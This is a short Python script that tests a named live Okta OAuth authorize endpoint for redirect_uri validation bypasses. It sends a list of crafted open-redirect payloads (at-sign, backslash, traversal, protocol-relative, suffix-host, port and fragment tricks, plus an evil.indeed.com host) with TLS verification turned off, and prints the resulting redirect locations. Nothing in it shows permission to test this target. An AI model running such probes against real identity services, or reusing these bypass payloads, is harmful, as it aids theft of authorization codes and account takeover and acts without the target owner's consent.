"""Indeed Okta authorize endpoints: check whether redirect_uri validation can be
bypassed. `state` is NOT the redirect target -- test redirect_uri directly and
leave state/nonce/response_type intact."""
import json

import requests
import urllib3

urllib3.disable_warnings()
H = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0",
     "Accept": "text/html,application/xhtml+xml"}

BASE = ("https://id.indeed.tech/oauth2/ausjlql7024a0HDjl4x7/v1/authorize"
        "?client_id=0oa2mdxsg1cJ7XQ2d4x7&response_type=code&scope=openid"
        "&state=xyz789&nonce=abc123")

cases = {
    "baseline-none": "",
    "google": "&redirect_uri=https%3A%2F%2Fgoogle.com",
    "indeed-sub": "&redirect_uri=https%3A%2F%2Fevil.indeed.com%2Fcb",
    "at-trick": "&redirect_uri=https%3A%2F%2Fid.indeed.tech%40google.com",
    "backslash": "&redirect_uri=https%3A%2F%2Fid.indeed.tech%5C%40google.com",
    "dotslash": "&redirect_uri=https%3A%2F%2Fid.indeed.tech%2F.cb%2F..%2F..%2F%40google.com",
    "double-slash": "&redirect_uri=%2F%2Fgoogle.com",
    "suffix-host": "&redirect_uri=https%3A%2F%2Fid.indeed.tech.google.com",
    "port": "&redirect_uri=https%3A%2F%2Fid.indeed.tech:443%40google.com",
    "encoded-frag": "&redirect_uri=https%3A%2F%2Fid.indeed.tech%23%40google.com",
}

for name, suffix in cases.items():
    url = BASE + suffix
    try:
        r = requests.get(url, headers=H, timeout=25, verify=False,
                         allow_redirects=False)
        loc = r.headers.get("Location") or ""
        body = r.text[:160].replace("\n", " ")
        print(f"{name:14} {r.status_code} loc={loc[:70]!r}")
        if r.status_code != 302 and body:
            print(f"               body: {body[:120]}")
    except Exception as e:
        print(f"{name:14} ERR {type(e).__name__}")
